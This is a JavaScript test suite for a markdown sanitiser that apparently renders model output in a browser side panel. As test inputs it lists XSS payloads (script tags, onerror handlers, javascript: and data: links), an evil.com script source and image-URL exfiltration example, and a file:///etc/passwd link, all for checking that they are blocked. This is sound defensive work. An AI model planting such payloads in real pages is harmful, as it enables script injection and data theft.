import assert from 'node:assert/strict';
import { test, describe } from 'node:test';
import { parseMarkdown, renderMarkdown, safeUrl } from '../../src/ui/markdown.js';
import { allElements, createFakeDocument } from './fake-dom.js';

const render = (md) => renderMarkdown(md, createFakeDocument());
const tags = (root) => allElements(root).map((e) => e.tagName);
const ALLOWED_OUTPUT = new Set(['p', 'h3', 'h4', 'h5', 'h6', 'strong', 'em', 'del', 'code', 'pre', 'blockquote', 'ul', 'ol', 'li', 'hr', 'br', 'a', 'table', 'thead', 'tbody', 'tr', 'th', 'td', 'div']);

function assertSafe(root) {
  for (const element of allElements(root)) {
    assert.ok(ALLOWED_OUTPUT.has(element.tagName), `輸出了不允許的標籤 ${element.tagName}`);
    for (const [name, value] of Object.entries(element.attributes)) {
      assert.ok(!/^on/i.test(name), `輸出了事件屬性 ${name}`);
      assert.notEqual(name, 'style');
      assert.notEqual(name, 'src');
      if (name === 'href') assert.match(value, /^(https?:|mailto:)/, `不安全的 href：${value}`);
    }
  }
}

describe('Markdown 消毒', () => {
  const attacks = [
    '<script>alert(1)</script>',
    '<SCRIPT SRC=//evil.com/x.js></SCRIPT>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<a href="javascript:alert(1)" onclick="alert(2)">點我</a>',
    '<iframe src="https://evil.com"></iframe>',
    '<style>body{display:none}</style>',
    '<div onmouseover="alert(1)">移過來</div>',
    '**<img src=x onerror=alert(1)>**',
    '`<script>alert(1)</script>`',
    '```html\n<script>alert(1)</script>\n```',
    '| a |\n|---|\n| <img src=x onerror=alert(1)> |',
    '- <script>alert(1)</script>',
    '> <script>alert(1)</script>',
    '# <script>alert(1)</script>',
    '[<img src=x onerror=alert(1)>](https://example.com)',
  ];

  for (const attack of attacks) {
    test(`原始 HTML 只會變成文字：${attack.slice(0, 40)}`, () => {
      const root = render(attack);
      assertSafe(root);
      assert.ok(!tags(root).some((t) => ['script', 'img', 'iframe', 'svg', 'style'].includes(t)));
    });
  }

  test('script 標籤的文字原樣保留，讓使用者看得到模型寫了什麼', () => {
    assert.equal(render('<script>alert(1)</script>').textContent, '<script>alert(1)</script>');
  });

  test('事件屬性不會成為元素屬性', () => {
    const root = render('<div onclick="alert(1)">x</div> [連結](https://example.com "標題")');
    for (const element of allElements(root)) assert.equal(element.getAttribute('onclick'), null);
    assert.ok(root.textContent.includes('onclick="alert(1)"'));
  });

  const badLinks = [
    '[點我](javascript:alert(1))',
    '[點我](JaVaScRiPt:alert(1))',
    '[點我]( javascript:alert(1))',
    '[點我](java\tscript:alert(1))',
    '[點我](vbscript:msgbox(1))',
    '[點我](data:text/html,<script>alert(1)</script>)',
    '[點我](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
    '[點我](&#106;avascript:alert(1))',
    '[點我](%6Aavascript:alert(1))',
    '[點我](file:///etc/passwd)',
    '[點我](chrome-extension://abc/sidepanel.html)',
    '[點我](//evil.com)',
    '[點我](/relative)',
    '[點我](https://google.com@evil.com)',
    '<javascript:alert(1)>',
    '![圖](javascript:alert(1))',
    'javascript:alert(1)',
  ];

  for (const link of badLinks) {
    test(`不安全連結不會產生 a 元素：${link}`, () => {
      const root = render(link);
      assertSafe(root);
      assert.ok(!tags(root).includes('a'), `${link} 產生了連結`);
    });
  }

  test('合法連結加上 noopener 並在新分頁開啟', () => {
    const [a] = allElements(render('[官方](https://example.com/p?q=1 "價格頁")')).filter((e) => e.tagName === 'a');
    assert.equal(a.getAttribute('href'), 'https://example.com/p?q=1');
    assert.equal(a.getAttribute('target'), '_blank');
    assert.match(a.getAttribute('rel'), /noopener/);
    assert.match(a.getAttribute('rel'), /noreferrer/);
    assert.equal(a.getAttribute('title'), '價格頁');
  });

  test('圖片語法不會自動載入，避免用圖片網址外傳資料', () => {
    const root = render('![機密](https://evil.com/leak?data=secret)');
    assert.ok(!tags(root).includes('img'));
    const [a] = allElements(root).filter((e) => e.tagName === 'a');
    assert.equal(a.textContent, '圖片：機密');
  });

  test('連結裡的連結不會巢狀', () => {
    const root = render('[外層 [內層](https://b.com)](https://a.com)');
    const anchors = allElements(root).filter((e) => e.tagName === 'a');
    assert.equal(anchors.length, 1);
    assert.equal(anchors[0].getAttribute('href'), 'https://a.com/');
  });
});

describe('safeUrl', () => {
  test('允許 http、https、mailto', () => {
    assert.equal(safeUrl('https://example.com/a'), 'https://example.com/a');
    assert.equal(safeUrl('http://example.com/'), 'http://example.com/');
    assert.equal(safeUrl('mailto:a@b.com'), 'mailto:a@b.com');
  });

  test('拒絕其他協定與非字串', () => {
    for (const bad of ['javascript:alert(1)', 'data:text/html,x', 'blob:https://a/b', 'ftp://a', '', '   ', null, undefined, 12, {}]) {
      assert.equal(safeUrl(bad), null, String(bad));
    }
  });

  test('拒絕帶帳密的網址與過長網址', () => {
    assert.equal(safeUrl('https://user:pw@example.com'), null);
    assert.equal(safeUrl(`https://example.com/${'a'.repeat(3000)}`), null);
  });
});

describe('Markdown 語法', () => {
  const firstTag = (md) => parseMarkdown(md)[0].tag;

  test('標題降階，不打亂面板的標題層級', () => {
    assert.equal(firstTag('# 大標'), 'h3');
    assert.equal(firstTag('## 中標'), 'h4');
  });

  test('粗體、斜體、刪除線、行內程式碼', () => {
    const list = tags(render('**粗** *斜* ~~刪~~ `碼`'));
    for (const tag of ['strong', 'em', 'del', 'code']) assert.ok(list.includes(tag), tag);
  });

  test('snake_case 不會被當成斜體', () => {
    assert.ok(!tags(render('呼叫 get_user_name 函式')).includes('em'));
  });

  test('清單與巢狀清單', () => {
    const root = render('- 甲\n  - 甲一\n- 乙\n\n1. 一\n2. 二');
    const list = tags(root);
    assert.equal(list.filter((t) => t === 'ul').length, 2);
    assert.equal(list.filter((t) => t === 'ol').length, 1);
    assert.equal(list.filter((t) => t === 'li').length, 5);
  });

  test('表格含對齊與跳脫的直線', () => {
    const root = render('| 品名 | 價格 |\n|---|---:|\n| a\\|b | $1 |');
    const cells = allElements(root).filter((e) => e.tagName === 'td');
    assert.equal(cells[0].textContent, 'a|b');
    assert.equal(cells[1].getAttribute('class'), 'align-right');
  });

  test('程式碼區塊內容不解析', () => {
    const root = render('```\n**不粗** [不連](https://a.com)\n```');
    assert.ok(!tags(root).includes('strong'));
    assert.ok(!tags(root).includes('a'));
    assert.equal(root.textContent, '**不粗** [不連](https://a.com)');
  });

  test('未結尾的程式碼區塊不會吃掉例外', () => {
    assert.equal(render('```\n沒有結尾').textContent, '沒有結尾');
  });

  test('裸網址自動成連結，且不吃到中文標點', () => {
    const [a] = allElements(render('請看 https://example.com/a。下一句')).filter((e) => e.tagName === 'a');
    assert.equal(a.getAttribute('href'), 'https://example.com/a');
  });

  test('空值與非字串不會丟錯', () => {
    assert.equal(render('').textContent, '');
    assert.equal(render(null).textContent, '');
    assert.equal(render(undefined).textContent, '');
  });
});

describe('惡意輸入不會卡住面板', () => {
  const inputs = {
    '大量未閉合星號': '*'.repeat(100_000),
    '大量未閉合中括號': '['.repeat(100_000),
    '大量反引號': '`'.repeat(100_000),
    '交錯反引號': '` `` '.repeat(30_000),
    '巢狀引用': `${'> '.repeat(5_000)}x`,
    '巢狀清單': Array.from({ length: 2_000 }, (_, i) => `${' '.repeat(i)}- x`).join('\n'),
    '大量連結開頭': '[a]('.repeat(30_000),
    '交錯強調': '**a *b '.repeat(20_000),
    '大量冒號分隔列': `|${'-|'.repeat(20_000)}`,
  };

  for (const [name, input] of Object.entries(inputs)) {
    test(name, () => {
      const started = Date.now();
      assertSafe(render(input));
      assert.ok(Date.now() - started < 3000, `花了 ${Date.now() - started}ms`);
    });
  }

  test('超長內容被截斷並明確告知', () => {
    assert.ok(render('字'.repeat(300_000)).textContent.includes('內容過長'));
  });
});
